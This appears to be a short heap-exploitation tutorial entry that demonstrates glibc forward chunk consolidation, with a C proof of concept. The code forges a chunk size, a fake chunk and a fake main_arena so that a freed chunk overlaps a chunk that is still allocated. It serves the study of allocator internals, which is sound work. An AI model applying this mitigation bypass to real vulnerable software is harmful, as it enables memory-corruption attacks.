<details>
<summary><strong>Description</strong></summary>
<p>

using forward consolidation to get overlapping memory...

chunk consolidation refers to when we free a chunk, that is next to an adjacent freed chunk (not present in the tcache/fastbin), and malloc will merge the two adjacent freed smaller chunks into one larger chunk. The purpose of this code is to show how we can consolidate a chunk we are currently freeing, into another allocated chunk...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {

    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, *chunk2, *consolidated_chunk;

    chunk0 = malloc(0x20); // this chunk stored fake main_arena
    chunk1 = malloc(0x420);
    chunk2 = malloc(0x80); // foward consolidate chunk1 into chunk2

    /*VULNERABILITY*/
    chunk1[-1] = 0x471; // overwrite size of chunk1 extends into chunk2
    /*VULNERABILITY*/

    chunk2[7] = 0x21; // fake chunk's size

    // set up fake arena (there is no side effect, bins mechanics act normal, this is needed to bypass mitigations during consolidation)
    chunk2[8] = ((long)chunk0); // set our fwd/bk ptrs for our fake chunk to chunk0 (fake main_arena)
    chunk2[9] = ((long)chunk0);

    chunk0[2] = (long)&chunk2[6]; // set our fwd/bk ptrs for our fake main_arena to fake chunk
    chunk0[3] = (long)&chunk2[6];

    chunk2[10] = 0x20; // bypass prev_size check of the chunk after fake chunk (the chunk we're consolidating into)
    chunk2[11] = 0x30; // bypass size check of the chunk after fake chunk (the chunk we're consolidating into)

    free(chunk1); // trigger foward consolidation
    consolidated_chunk = malloc(0x480);

    printf("consolidated chunk: %p\n", consolidated_chunk);
    printf("consolidated chunk end: %p\n", consolidated_chunk + 0x480 + 0x10);
    printf("chunk2 (still allocated): %p\n", chunk2);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/malloc/fwd_consolidation/readme.md
> i modified it a little (easier to use?)...

</p>
</details>